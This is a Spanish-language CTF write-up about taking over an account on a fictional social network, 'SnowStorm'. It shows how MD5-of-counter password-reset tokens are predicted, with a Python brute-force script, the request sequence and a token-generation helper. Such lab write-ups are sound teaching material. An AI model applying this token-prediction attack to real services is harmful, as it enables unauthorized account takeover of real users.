# Desafío SnowStorm: Write-up "El Cambia Nombres de Juan Pérez"

## 0. Resumen del Desafío

* **Plataforma:** SnowStorm (Red Social Ficticia del CTF)
* **Objetivo:** Comprometer la cuenta del usuario "Juan Pérez", cambiar su nombre de perfil a "Soy un idiota" y, como resultado, obtener la flag del desafío.
* **Credenciales Proporcionadas:** Se nos otorgó acceso como el usuario `carlos.ruiz@hacklab.com`.

## 1. Vulnerabilidad Principal Identificada: Generación Débil y Predecible de Tokens de Reseteo de Contraseña

La vulnerabilidad crítica explotada residía en el mecanismo de generación de los tokens para el reseteo de contraseñas. Se descubrió que los tokens eran simplemente el hash **MD5 de un ID numérico incremental y global**, sin un "salt" criptográfico y sin incluir información del usuario (como el email) en el propio input del hash.

* **Fórmula del Token:** `Token = MD5(str(ID_NUMERICO_GLOBAL))`

Esto hacía que los tokens fueran predecibles si se podía estimar el valor actual del contador global.

## 2. Herramientas Utilizadas

* Un cliente HTTP para interactuar con la API de SnowStorm (ej. cURL, Postman, o las herramientas de desarrollador del navegador).
* Python para scripting, específicamente para:
    * Calcular hashes MD5.
    * Automatizar la búsqueda del `ID_NUMERICO` correspondiente a un token conocido.

## 3. Pasos de la Explotación

La explotación se basó en obtener un valor reciente del contador global y luego usar el siguiente valor para predecir el token del usuario objetivo.

### 3.1. Análisis Inicial y Confirmación de la Fórmula del Token

* **Observación Inicial:** Los tokens de reseteo eran cadenas hexadecimales de 32 caracteres (sugiriendo MD5).
* **Pruebas con Múltiples Tokens:** Se generaron múltiples tokens para una cuenta controlada (ej. `lautig@yopmail.com`). Se notó que los tokens eran diferentes para cada solicitud.
* **Análisis de Patrones con Script:** Para confirmar la hipótesis `Token = MD5(str(ID_NUMERICO))`, se utilizó un script en Python para analizar una lista de tokens conocidos (los 12 que se obtuvieron para `lautig@yopmail.com`). El script intentaba encontrar un `ID_NUMERICO` para cada token.

    **Script de Análisis de Lista de Tokens:**
    ```python
    import hashlib

    def calcular_md5(texto):
        """Calcula el hash MD5 de un texto y lo devuelve en hexadecimal."""
        return hashlib.md5(texto.encode('utf-8')).hexdigest()

    # Los 12 tokens que se analizaron (ejemplo)
    tokens_a_analizar = [
        "90e1357833654983612fb05e3ec9148c", # -> Encontró ID 1804
        "7ffd85d93a3e4de5c490d304ccd9f864", # -> Encontró ID 1805
        "d1e946f4e67db4b362ad23818a6fb78a", # -> Encontró ID 1806
        "6e79ed05baec2754e25b4eac73a332d2", # -> Encontró ID 1810
        "1f1baa5b8edac74eb4eaa329f14a0361", # -> Encontró ID 1807
        "5b6ba13f79129a74a3e819b78e36b922", # -> Encontró ID 1812
        "39027dfad5138c9ca0c474d71db915c3", # -> Encontró ID 1808
        "645098b086d2f9e1e0e939c27f9f2d6f", # -> Encontró ID 1809
        "faacbcd5bf1d018912c116bf2783e9a1", # -> Encontró ID 1816
        "09b15d48a1514d8209b192a8b8f34e48", # -> Encontró ID 1811
        "f542eae1949358e25d8bfeefe5b199f1", # -> Encontró ID 1813
        "f0bbac6fa079f1e00b2c14c1d3c6ccf0"  # -> Encontró ID 1815
    ]

    rango_ids_min = 0 
    rango_ids_max = 5000 # Ajustar según sea necesario

    print(f"--- Iniciando Análisis de Lista de Tokens con MD5(id_string) ---")
    print(f"Probando IDs desde {rango_ids_min} hasta {rango_ids_max} para cada token.\n")

    for i, token_actual_de_lista in enumerate(tokens_a_analizar):
        print(f"Analizando token #{i+1}: {token_actual_de_lista}")
        encontrado_para_este_token = False
        for id_valor_numerico in range(rango_ids_min, rango_ids_max + 1):
            id_actual_str = str(id_valor_numerico)
            texto_a_hashear = id_actual_str
            hash_generado = calcular_md5(texto_a_hashear)
            if hash_generado == token_actual_de_lista:
                print(f"  !!! ÉXITO para token {token_actual_de_lista} !!!")
                print(f"  ID encontrado: {id_actual_str}")
                print(f"  Input al MD5: '{texto_a_hashear}' (solo el ID)")
                print("-" * 30)
                encontrado_para_este_token = True
                break 
        if not encontrado_para_este_token:
            print(f"  No se encontró un ID para el token {token_actual_de_lista} en el rango.")
            print("-" * 30)
    print("\n--- Análisis de Lista de Tokens Completado ---")
    ```
* **Resultados del Script:** El script confirmó que cada uno de los 12 tokens era el MD5 de un ID numérico (ej. "1804", "1805", etc.). Esto validó la fórmula `Token = MD5(str(ID_NUMERICO))` y demostró que los IDs estaban en un rango cercano, sugiriendo un contador global.

### 3.2. Obtención del Valor Actual del Contador Global (Punto de Referencia)
1.  Se solicitó un reseteo de contraseña para una cuenta controlada por el atacante (llamémosla `atacante@yopmail.com`) usando `POST /api/forgot/`.
2.  Se obtuvo el token (`TOKEN_ATACANTE`) enviado a `atacante@yopmail.com`.
3.  Usando un script similar al anterior (o el de un solo token), se encontró el `ID_ATACANTE` tal que `MD5(str(ID_ATACANTE)) == TOKEN_ATACANTE`. Este `ID_ATACANTE` nos dio el valor más reciente conocido del contador global. *(Ejemplo: Si el ID encontrado fue `N`)*.

### 3.3. Predicción y Uso del Token para Juan Pérez
1.  **Inmediatamente después** de obtener `ID_ATACANTE`, se solicitó un reseteo de contraseña para el objetivo, `juan.perez@hacklab.com`, usando `POST /api/forgot/`.
    * Esto hizo que el servidor generara un token para Juan Pérez usando el siguiente ID disponible en la secuencia global. Se asumió que este sería `ID_JUAN = ID_ATACANTE + 1` (es decir, `N + 1`).
2.  Se calculó el token predicho para Juan: `TOKEN_JUAN_PREDICHO = MD5(str(ID_JUAN))`.
    * *(Tu comentario: "saque el hash me fije el numero, el siguiente email que puse fue el de juan y como se que es incremental el numero le sume uno al anterior y listo tenia el hash")*
3.  Se utilizó `TOKEN_JUAN_PREDICHO` para establecer una nueva contraseña para Juan Pérez mediante una solicitud `POST` a `/api/recovery/`:
    ```json
    {
      "token": "TOKEN_JUAN_PREDICHO_CALCULADO",
      "password": "NuevaPasswordParaJuan"
    }
    ```

### 3.4. Acceso y Consecución del Objetivo
1.  Se inició sesión como `juan.perez@hacklab.com` con la `NuevaPasswordParaJuan`.
2.  Se navegó a la página de perfil y se actualizó el nombre a "Soy un idiota" (enviando un `POST` a `/api/user/update/`).
3.  ¡Flag obtenida!

## 4. Script Útil (Python para generar MD5 de un ID numérico individual)

```python
import hashlib

def calcular_md5(id_como_cadena):
    """Calcula el hash MD5 de una cadena de texto (que representa un ID)."""
    return hashlib.md5(id_como_cadena.encode('utf-8')).hexdigest()

if __name__ == "__main__":
    id_numerico_str = input("Ingresa el ID numérico (como cadena) para generar su MD5: ")
    if id_numerico_str.lower() == 'salir':
        exit()
    hash_resultante = calcular_md5(id_numerico_str)
    print(f"El MD5 de la cadena '{id_numerico_str}' es: {hash_resultante}")
```
## 5. Impacto
La vulnerabilidad permite la toma de control de cualquier cuenta de usuario (Account Takeover) si se puede predecir el ID numérico que se usará para generar su token de reseteo.